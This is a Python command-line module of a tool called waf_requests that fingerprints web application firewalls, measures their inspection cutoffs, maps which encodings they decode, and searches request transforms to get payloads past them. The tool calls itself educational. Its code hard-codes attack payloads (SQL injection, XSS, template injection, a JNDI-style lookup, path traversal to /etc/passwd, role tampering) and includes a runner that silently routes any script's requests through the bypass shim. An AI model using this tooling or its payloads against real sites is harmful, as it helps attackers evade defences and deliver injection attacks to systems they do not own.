"""Command-line surface: detect | find-limit | selftest | verify | run.

Probe tools use a plain requests.Session on purpose - they must observe the
WAF's behavior against unmodified traffic.
"""
from __future__ import annotations

import argparse
import json
import runpy
import sys
from typing import List, Optional

import requests

from . import encodings
from .blockpage import classify
from .payloads import CATEGORIES
from .detect import fingerprint
from .engine import WAFSession

#: Canonical attack payloads used by selftest/verify; ids match the origin
#: lab's X-Origin-Saw-Payload tokens.
ATTACKS = [
    ("jndi", "${${env:MARKER}}"),
    ("sqli", "' OR '1'='1"),
    ("xss", "<script>alert(1)</script>"),
    ("ssti", "{{7*7}}"),
    ("traversal", "../../../../etc/passwd"),
    ("jsontamper", '{"role":"admin"}'),
]


def _print_verdict(tag: str, resp) -> None:
    verdict = classify(resp)
    saw = resp.headers.get("X-Origin-Saw-Payload", "")
    print(f"  {tag:<6} status={resp.status_code} verdict={verdict.status.value:<9} "
          f"vendor={verdict.vendor or '-':<10} evidence={verdict.evidence!r} origin_saw={saw!r}")


def cmd_detect(args) -> int:
    vendor = fingerprint(args.url)
    print(json.dumps({"url": args.url, "vendor": vendor}, indent=2))
    return 0


def _probe_blocked(base_url: str, param: str, marker: str, offset: int,
                   timeout: float, in_body: bool = False) -> bool:
    """True when a marker placed at byte ``offset`` is still blocked.

    Query mode: GET ?param=AAA...marker. Body mode: POST the same shape as a
    urlencoded body - the documented AWS/Cloudflare/Akamai inspection windows
    are body-scoped, so measure there.
    """
    if in_body:
        resp = requests.post(
            base_url,
            data=f"filler={'A' * offset}&{param}={requests.utils.quote(marker, safe='')}",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=timeout,
        )
    else:
        probe_url = f"{base_url}?{param}={'A' * offset}{marker}"
        resp = requests.get(probe_url, timeout=timeout)
    verdict = classify(resp)
    if verdict.status.name == "UNKNOWN":
        raise RuntimeError(
            f"ambiguous response at offset {offset}: {verdict.evidence}; "
            "find-limit needs explicit block signatures"
        )
    return verdict.status.name == "BLOCKED"


def cmd_find_limit(args) -> int:
    base = args.url.rstrip("?")
    timeout = 15.0
    try:
        if not _probe_blocked(base, args.param, args.marker, 0, timeout, args.body):
            print("marker not blocked at offset 0 - no measurable window (or target down)")
            return 1
        lo, hi = 0, 1024
        while hi <= args.max_offset:
            if not _probe_blocked(base, args.param, args.marker, hi, timeout, args.body):
                break
            lo = hi
            hi *= 2
        else:
            print(f"still blocked at {args.max_offset} bytes - window above search bound")
            return 1
        while hi - lo > 16:
            mid = (lo + hi) // 2
            if _probe_blocked(base, args.param, args.marker, mid, timeout, args.body):
                lo = mid
            else:
                hi = mid
    except (requests.RequestException, RuntimeError) as exc:
        print(f"SKIP {exc}")
        return 1
    prefix = len(args.param) + 1
    print(f"measured cutoff for {base}")
    print(f"  payload offset where blocking stops : {hi}")
    print(f"  approx inspection window            : {hi + prefix + len(args.marker)} bytes")
    print(f"  (param={args.param}, marker={args.marker}, mode={'body' if args.body else 'query'})")
    return 0


def cmd_selftest(args) -> int:
    raw = requests.Session()
    shim = WAFSession(profile=args.profile, verbose=False)
    print(f"selftest vs {args.url} (profile={args.profile})")
    for name, payload in ATTACKS:
        print(f"[{name}] payload={payload!r}")
        try:
            raw_resp = raw.get(
                f"{args.url.rstrip('/')}/search", params={"q": payload}, timeout=20,
            )
            _print_verdict("raw:", raw_resp)
            shim_resp = shim.get(
                f"{args.url.rstrip('/')}/search", params={"q": payload}, timeout=20,
            )
            _print_verdict("shim:", shim_resp)
            for attempt in getattr(shim_resp, "waf_attempts", []):
                print(f"         attempt transform={attempt.transform_id or 'original':<24} "
                      f"-> {attempt.status.value} ({attempt.http_status})")
        except requests.RequestException as exc:
            print(f"  SKIP connection error: {exc}")
    return 0


def cmd_verify(args) -> int:
    """Prove what the ORIGIN interpreted after the bypass ladder ran.

    For every attack: intended payload -> ladder -> response; compare the
    origin-reflected query (decoded to fixpoint, covering stacked encodings)
    against the intent. PASS requires equality on a DELIVERED response - a
    block page echo never counts.
    """
    from .fidelity import decode_to_fixpoint, reflected_query_value

    shim = WAFSession(profile=args.profile)
    print(f"verify vs {args.url} (profile={args.profile})")
    passes = diverged = unproven = 0
    for name, payload in ATTACKS:
        try:
            resp = shim.get(
                f"{args.url.rstrip('/')}/search", params={"q": payload}, timeout=30,
            )
        except requests.RequestException as exc:
            print(f"[{name}] SKIP {exc.__class__.__name__}")
            continue
        verdict = classify(resp)
        fidelity_info = getattr(resp, "payload_fidelity", {})
        tier = fidelity_info.get("tier", "?")
        winner = fidelity_info.get("transform") or "original"
        saw_header = resp.headers.get("X-Origin-Saw-Payload", "")
        reflected_raw = reflected_query_value(resp.text)
        # Form-encoding spells spaces as '+'; that is the same semantic byte
        # per RFC 9110 application/x-www-form-urlencoded parsing.
        reflected = (
            reflected_raw.replace("+", " ") if reflected_raw else None
        )
        intended = decode_to_fixpoint(payload)

        if verdict.status.name != "DELIVERED":
            outcome = "BLOCKED(no-delivery)"
        elif saw_header and name in saw_header.split(","):
            outcome = "PASS(origin-header)"
        elif reflected is not None and intended in reflected:
            outcome = "PASS(reflected-equal)"
        elif reflected is not None:
            outcome = f"DIVERGE(origin-saw={reflected!r})"
        else:
            outcome = "UNPROVEN(no origin reflection)"

        if outcome.startswith("PASS"):
            passes += 1
        elif outcome.startswith("DIVERGE"):
            diverged += 1
        else:
            unproven += 1
        marker = "!" if outcome.startswith("DIVERGE") else " "
        print(f"{marker}[{name:<10}] {verdict.status.value:<9} via={winner:<24} "
              f"tier={tier:<12} {outcome}")
    print(f"\npass={passes} diverge={diverged} unproven/blocked={unproven}")
    print("PASS = origin decoded exactly the intended payload. "
          "differential-tier wins must show PASS before you trust them.")
    return 0 if diverged == 0 else 1

def cmd_probe_decode(args) -> int:
    """Map which encodings the WAF decodes: send the payload in each variant."""
    base = args.url.rstrip("/")
    session = requests.Session()
    print(f"probe-decode vs {base} payload={args.payload!r}")
    for name, encoder in encodings.DECODE_VARIANTS:
        if encoder is None:
            resp = session.get(f"{base}/search", params={args.param: args.payload}, timeout=20)
        else:
            resp = session.get(f"{base}/search?{args.param}={encoder(args.payload)}", timeout=20)
        verdict = classify(resp)
        meaning = ("decoded" if verdict.status.name == "BLOCKED"
                   else "blind" if verdict.status.name == "DELIVERED"
                   else verdict.status.name.lower())
        print(f"  {name:<16} {verdict.status.value:<10} {meaning}")
    return 0


def cmd_exploit(args) -> int:
    """Search payload-variant x request-transform candidates for a bypass."""
    shim = WAFSession(profile=args.profile)
    base = args.url.rstrip("/")
    url = f"{base}/search?{args.param}={{payload}}"
    print(f"exploit {url} payload={args.payload!r} category={args.category}")
    try:
        resp = shim.exploit("GET", url, args.payload, args.category, max_attempts=40)
    except requests.RequestException as exc:
        print(f"SKIP connection error: {exc}")
        return 1
    for attempt in getattr(resp, "waf_attempts", []):
        print(f"  {attempt.transform_id or 'original':<24} -> "
              f"{attempt.status.value} ({attempt.http_status})")
    print("payload_fidelity:", json.dumps(getattr(resp, "payload_fidelity", {}), sort_keys=True))
    return 0


def cmd_run(args) -> int:
    from ._shim import install

    script = args.script[0]
    sys.argv = [script] + list(args.script[1:])
    install()
    runpy.run_path(script, run_name="__main__")
    return 0

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="python -m waf_requests",
        description="educational WAF-bypass request tooling (owned targets only)",
    )
    sub = parser.add_subparsers(dest="command", required=True)

    p = sub.add_parser("detect", help="fingerprint the WAF in front of URL")
    p.add_argument("url")
    p.set_defaults(func=cmd_detect)

    p = sub.add_parser("find-limit", help="binary-search the param/body inspection cutoff")
    p.add_argument("url")
    p.add_argument("--param", default="q")
    p.add_argument("--marker", default="M7MARKER")
    p.add_argument("--max-offset", type=int, default=262144)
    p.add_argument("--body", action="store_true",
                   help="probe in the POST body (the documented windows are body-scoped)")
    p.set_defaults(func=cmd_find_limit)

    p = sub.add_parser("selftest", help="send canonical attacks raw vs shimmed")
    p.add_argument("url")
    p.add_argument("--profile", default="auto")
    p.set_defaults(func=cmd_selftest)

    p = sub.add_parser("verify", help="prove the origin interpreted the intended payload")
    p.add_argument("url")
    p.add_argument("--profile", default="auto")
    p.set_defaults(func=cmd_verify)

    p = sub.add_parser("probe-decode", help="map which encodings the WAF decodes")
    p.add_argument("url")
    p.add_argument("--payload", default="' OR '1'='1")
    p.add_argument("--param", default="q")
    p.set_defaults(func=cmd_probe_decode)

    p = sub.add_parser("exploit", help="search payload-variant x transform candidates for a bypass")
    p.add_argument("url")
    p.add_argument("--payload", required=True)
    p.add_argument("--category", required=True, choices=sorted(CATEGORIES))
    p.add_argument("--param", default="q")
    p.add_argument("--profile", default="auto")
    p.set_defaults(func=cmd_exploit)

    p = sub.add_parser("run", help="run SCRIPT with `import requests` mapped to waf_requests")
    p.add_argument("script", nargs="+")
    p.set_defaults(func=cmd_run)
    return parser


def main(argv: Optional[List[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    return args.func(args)
